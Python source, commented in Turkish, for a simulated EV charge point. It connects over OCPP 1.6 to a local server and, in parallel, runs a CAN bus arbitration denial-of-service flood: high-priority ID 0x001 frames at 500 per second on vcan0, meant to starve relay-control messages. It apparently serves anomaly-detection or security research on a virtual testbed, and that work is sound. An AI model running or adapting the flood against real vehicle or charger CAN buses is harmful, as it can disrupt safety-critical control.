import asyncio
import logging
import can
import websockets
from datetime import datetime, timezone

from ocpp.v16 import ChargePoint as cp, call, call_result
from ocpp.v16.enums import RegistrationStatus, RemoteStartStopStatus
from ocpp.routing import on

# --- LOG AYARI ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - [İSTEMCİ] - %(message)s')

# --- DONANIM (vcan0) AYARI ---
# CAN Bus bağlantısı, CAN Arbitration DoS simülasyonu için kritik
try:
    # vcan0/can0 gibi arayüzü kontrol et
    can_bus = can.interface.Bus(channel='vcan0', interface='socketcan')
    logging.info("Donanım (vcan0) bağlantısı BAŞARILI.")
except Exception as e:
    logging.warning(f"Donanım bağlantısı BAŞARISIZ (vcan0 bulunamadı). Devam ediliyor: {e}")
    can_bus = None

# --- Yardımcı Fonksiyon: CAN Mesajı Gönderme ---
def donanima_komut_yolla(can_id, data):
    """
    Belirtilen CAN ID ve veri ile mesajı CAN Bus'a gönderir.
    (Normal kontrol mesajlarını temsil eder)
    """
    if can_bus:
        try:
            msg = can.Message(arbitration_id=can_id, data=data, is_extended_id=False)
            can_bus.send(msg)
            logging.info(f"Donanıma İletildi (Kontrol) -> ID: {hex(can_id)} Data: {data}")
        except Exception as e:
            logging.error(f"Donanım Hatası: {e}")

# --- ANOMALİ SİMÜLASYONU: ARBITRATION DOS (LOW-ID FLOODING) ---
async def start_arbitration_flood():
    """
    CAN Arbitration DoS (Low-ID Flooding) saldırısını simüle eder.
    Çok düşük ID (yüksek öncelikli) mesajları sürekli ve yüksek hızda gönderir.
    """
    if can_bus is None:
        logging.warning("CAN Bus arayüzü aktif değil. Arbitration DoS simülasyonu başlatılamadı.")
        return

    # Saldırı parametreleri
    LOW_ID = 0x001 # Çok düşük ID (yüksek öncelikli). Genellikle 0x000 / 0x001 kullanılır [cite: 25, 39]
    FLOOD_RATE_MSGS_PER_SEC = 500 # Saniyede 500 mesaj hedefi. (500-1000 msg/s saldırı hızı örneklenmiştir [cite: 32, 40])
    DELAY = 1.0 / FLOOD_RATE_MSGS_PER_SEC

    logging.critical(f"🚨 ANOMALİ BAŞLATILIYOR: Arbitration DoS (Low-ID Flood, ID: {hex(LOW_ID)}, Hız: {FLOOD_RATE_MSGS_PER_SEC} msg/s)")

    # Simülasyon verisi: 8 byte rastgele veri veya protokolün izin verdiği max.
    # Bu verinin içeriği önemli değil, sadece meşguliyet yaratması amaçlanır [cite: 26]
    flood_data = [0xAA] * 8 

    while True:
        try:
            # Arbitration kuralları nedeniyle bu düşük ID, bus'ta sürekli dominant kalır [cite: 42, 49]
            msg = can.Message(arbitration_id=LOW_ID, data=flood_data, is_extended_id=False)
            can_bus.send(msg)
            # Yüksek frekansta göndermek için küçük bir gecikme
            await asyncio.sleep(DELAY) 
        except Exception as e:
            logging.error(f"Flood Sırasında Kritik Donanım Hatası: {e}")
            await asyncio.sleep(1) # Hata durumunda fazla yüklenmemek için bekle
            
# --- OCPP İstemci Sınıfı ---
class SablonChargePoint(cp):

    async def send_meter_values(self):
        """ Düzenli enerji raporu gönderir (NORMAL DAVRANIŞ) """
        sayac = 0
        while True:
            sayac += 10 
            payload = [{
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "sampled_value": [{"value": str(sayac), "unit": "Wh"}]
            }]
            # MeterValues'ın gecikmeye uğradığını görmek için bu metodu aktif edebilirsiniz
            # await self.call(call.MeterValues(connector_id=1, meter_value=payload))
            await asyncio.sleep(5)

    @on('RemoteStartTransaction')
    async def on_remote_start(self, id_tag, **kwargs):
        logging.info(f"KOMUT ALINDI: Şarj Başlat (Kart: {id_tag})")
        # Kritik kontrol mesajı (örneğin röleyi açma)
        # Bu mesaj, arka plandaki flood nedeniyle gecikebilir veya drop olabilir [cite: 26, 44]
        donanima_komut_yolla(0x200, [0x01, 0x01]) 
        return call_result.RemoteStartTransaction(status=RemoteStartStopStatus.accepted)

    @on('RemoteStopTransaction')
    async def on_remote_stop(self, transaction_id, **kwargs):
        logging.info(f"KOMUT ALINDI: Şarj Durdur (TxID: {transaction_id})")
        # Kritik kontrol mesajı (örneğin röleyi kapatma)
        donanima_komut_yolla(0x201, [0x00, 0x00]) 
        return call_result.RemoteStopTransaction(status=RemoteStartStopStatus.accepted)

    async def send_boot_notification(self):
        """ Sunucuya boot bildirimi gönderir ve cevabı bekler. """
        request = call.BootNotification(
            charge_point_model="EV-Simulasyon",
            charge_point_vendor="SecVolt-Test"
        )
        response = await self.call(request)
        if response.status == RegistrationStatus.accepted:
            logging.info("Sunucuya başarıyla kaydedildi.")
        else:
            logging.error("Sunucuya kayıt başarısız.")
        return response

async def main():
    uri = 'ws://localhost:9000/CHARGER-001' # Bağlantı URI'si
    logging.info(f"Sunucuya bağlanılıyor: {uri}")
    
    try:
        async with websockets.connect(uri, subprotocols=['ocpp1.6']) as ws:
            logging.info("Sunucuya bağlantı kuruldu.")
            client = SablonChargePoint('CHARGER-001', ws)
            
            # Tüm görevleri paralel olarak çalıştır
            await asyncio.gather(
                client.start(),               # OCPP mesaj dinleme ve işleme
                client.send_boot_notification(), # Kayıt bildirimi
                client.send_meter_values(),   # Normal operasyon (Sayaç)
                start_arbitration_flood()     # 🚨 ANOMALİ SİMÜLASYONU 
            )
    except ConnectionRefusedError:
        logging.error("Bağlantı Hatası: Sunucu aktif değil veya belirtilen adreste dinlemiyor.")
    except Exception as e:
        logging.error(f"Beklenmedik bir hata oluştu: {e}")

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.info("İstemci kapatılıyor.")
    finally:
        if can_bus: can_bus.shutdown()
